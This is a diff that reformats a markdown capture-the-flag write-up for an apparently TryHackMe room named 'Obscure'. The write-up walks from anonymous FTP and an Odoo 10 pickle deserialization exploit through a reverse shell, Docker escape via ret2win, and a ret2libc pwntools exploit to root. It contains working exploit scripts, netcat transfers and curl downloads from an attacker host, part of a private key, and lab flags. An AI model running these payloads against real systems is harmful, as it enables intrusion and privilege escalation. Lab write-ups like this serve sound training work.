@@ -2,30 +2,29 @@
 sticker: emoji//26ab
 ---
 
+# OBSCURE
 
-# ENUMERATION
----
+## ENUMERATION
 
+***
 
+### OPEN PORTS
 
-## OPEN PORTS
----
-
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 21   | FTP     |
 | 22   | SSH     |
 | 80   | HTTP    |
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
+***
 
 Ftp Anonymous login is enabled, let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328163655.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328163655.png)
 
 Let's check both files:
 
@@ -37,12 +36,10 @@ From antisoft.thm security,
 A number of people have been forgetting their passwords so we've made a temporary password application.
 ```
 
-
 ```
 file password
 password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped
 ```
-
 
 Let's try checking the strings of the file:
 
@@ -141,10 +138,10 @@ _ITM_registerTMCloneTable
 
 If we check the strings, we can notice the following:
 
-- When executed, the program prompts the user for their **employee ID** (e.g., `Please enter your employee id that is in your email`).
-- It checks if the entered ID matches the hardcoded value `971234596` (found in the `strings` output).
-- If the ID is correct, it generates/retrieves the password.
-- If incorrect, it prints `Incorrect employee id`.
+* When executed, the program prompts the user for their **employee ID** (e.g., `Please enter your employee id that is in your email`).
+* It checks if the entered ID matches the hardcoded value `971234596` (found in the `strings` output).
+* If the ID is correct, it generates/retrieves the password.
+* If incorrect, it prints `Incorrect employee id`.
 
 So, let's execute the file and submit the correct id:
 
@@ -156,14 +153,13 @@ Please enter your employee id that is in your email
 remember this next time 'SecurePassword123!'
 ```
 
-
 Let's save that for now, we can proceed to the web application.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328165621.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328165621.png)
 
 It's a login page but we can find something interesting in here, a `manage databases` section, if we go into it we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328165709.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328165709.png)
 
 We can create a backup of the `main` database, let's use the password we got from earlier, it gives us a zip file, when we unzip it, we get a `filestore` and `dump.sql` file, with this, we can check on some basic stuff, for example, let's check the tables:
 
@@ -179,36 +175,31 @@ public.res_users
 
 If we try visualizing the contents, we can find the `admin@antisoft.thm` user:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328171455.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328171455.png)
 
 Let's try using the password we got before, if we're lucky, we can access the panel:
-
 
 ```
 admin@antisoft.thm:SecurePassword123!
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328171629.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328171629.png)
 
 There we go, let's start exploitation phase.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
-We are inside `odoo`, **Odoo** is a popular **open-source Enterprise Resource Planning (ERP) software** used by businesses to manage operations like sales, accounting, inventory, HR, and more, let's look at the version:
+We are inside `odoo`, **Odoo** is a popular **open-source Enterprise Resource Planning (ERP) software** used by businesses to manage operations like sales, accounting, inventory, HR, and more, let's look at the version:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328171739.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328171739.png)
 
 Let's search for an exploit:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328171812.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328171812.png)
 
 We got a code execution vulnerability regarding Odoo 10
-
 
 ```
 ## Vulnerability Details
@@ -222,13 +213,11 @@ In order to exploit the vulnerability, you should navigate to the Apps page (the
 Once we have the module installed, we navigate to the settings page and select “Anonymize database” under “Database anonymization” and click on the “Anonymize Database” button. Next, we refresh the page and navigate to the same page under settings. We upload the “exploit.pickle” file generated our script and click on “Reverse the Database Anonymization” button. We should have a reverse shell.
 ```
 
-
 Let's use the exploit provided by `exploit-db`:
 
 Link: https://www.exploit-db.com/exploits/44064
 
 We need to modify the script a little bit:
-
 
 ```python
 import cPickle
@@ -245,7 +234,6 @@ with open("exploit.pickle", "wb") as f:
 
 ```
 
-
 We can now use it:
 
 ```
@@ -260,8 +248,7 @@ Remove the "Apps" filter and search for Database Anonymization.
 Install the module
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328172649.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328172649.png)
 
 Now:
 
@@ -274,20 +261,19 @@ Set up listener
 Upload exploit.pickle and confirm.
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328173631.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328173631.png)
 
 If we check our listener:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328173643.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328173643.png)
 
 We got our shell, let's proceed with privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
+***
 
 Let's start with stabilizing our shell:
-
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -299,22 +285,21 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328173800.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328173800.png)
 
 Now we're good to start, we can check this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328174443.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328174443.png)
 
 We got a `/ret` binary, let's run it:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328174509.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328174509.png)
 
 Weird, it could mean we are inside of a docker container:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328174532.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328174532.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328174544.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328174544.png)
 
 We are inside of a docker container, let's analyze the binary in our local machine, since `python3` is not enabled in the container we need to go with `nc`:
 
@@ -325,23 +310,21 @@ nc -w 3 RECEIVER_IP PORT < ret # On our shell
 
 We can go with `ghidra` to analyze the binary:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328175340.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328175340.png)
 
 We can see the following, there's a `vuln()` function which goes with this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328175458.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328175458.png)
 
 The vuln function uses `gets()`, we can find another function called `win`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328175558.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328175558.png)
 
 We are dealing with something called `ret2win`, let's search how to exploit this:
 
 Info: https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win
 
-
 We can do this, after analyzing the binary, I found that the `win()` function address is `0x400646` and the `$rsp` location is `136`, with this data, we can craft the following script to get a test payload:
-
 
 ```python
 import pwn
@@ -377,7 +360,7 @@ We can now do this:
 
 If we do this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328181735.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328181735.png)
 
 We got root on the docker container, we need some way to break out of it, let's use a `nmap` binary to scan the network:
 
@@ -389,7 +372,7 @@ curl http://10.6.34.159:8000/nmap -o /tmp/nmap
 ./tmp/nmap -sT -p- 172.17.0.1
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328182044.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328182044.png)
 
 Something is running on port `4444`, let's use `nc` to look at it:
 
@@ -397,7 +380,7 @@ Something is running on port `4444`, let's use `nc` to look at it:
 nc 172.17.0.1 4444
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328182132.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328182132.png)
 
 It runs the same as `ret` binary, we can exploit it in the same way then:
 
@@ -405,12 +388,11 @@ It runs the same as `ret` binary, we can exploit it in the same way then:
 (cat /tmp/payload.p; cat) | nc 172.17.0.1 4444
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328182223.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328182223.png)
 
 We got a shell as `zeeshan`, let's try reading his home folder to check if there's a private key for ssh:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328182321.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328182321.png)
 
 There we go, let's get it:
 
@@ -446,7 +428,7 @@ c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
 
 We can now go into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328182433.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328182433.png)
 
 We finally got out of the docker container, with this, let's figure out how to get into root:
 
@@ -460,10 +442,9 @@ User zeeshan may run the following commands on hydra:
     (root) NOPASSWD: /exploit_me
 ```
 
-
 We got a `/exploit_me` file, let's check it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328182732.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328182732.png)
 
 Let's download the file in our local machine and analyze it:
 
@@ -472,7 +453,7 @@ file exploit_me
 exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=589ddc7b680c9a773ae64cc2db0e877b490e943e, not stripped
 ```
 
-We can use the following payload to get root:```
+We can use the following payload to get root:\`\`\`
 
 ```python
 from pwn import *
@@ -539,15 +520,13 @@ Gets address: 0x7f2227e81d90
 Setuid address: 0x7f2227ee0330
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328185828.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328185828.png)
 
 Now, with each address, we can calculate the offset to the base address using libc:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328185935.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328185935.png)
 
 Let's download the second file, the first file didn't work for me and simply do the following payload to get root:
-
-
 
 ```python
 from pwn import *
@@ -611,8 +590,7 @@ p.interactive()
 
 We get the following:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328191503.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328191503.png)
 
 There we go, we can add `zeeshan` to `sudoers` to move easily using ssh:
 
@@ -626,10 +604,12 @@ And then:
 sudo su
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328191705.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328191705.png)
+
 ```
 find / -type f \( -path /proc -o -path /sys -o -path /dev \) -prune -o -name "*.txt" -exec grep -H 'THM{\{' {} \; 2>/dev/null
 ```
+
 Now, we can read all flags:
 
 ```
@@ -647,5 +627,4 @@ root@hydra:/home/zeeshan# cat /root/root.txt
 THM{8bbc6221d009576d37e28acdd9da7aba}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328192438.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250328192438.png)
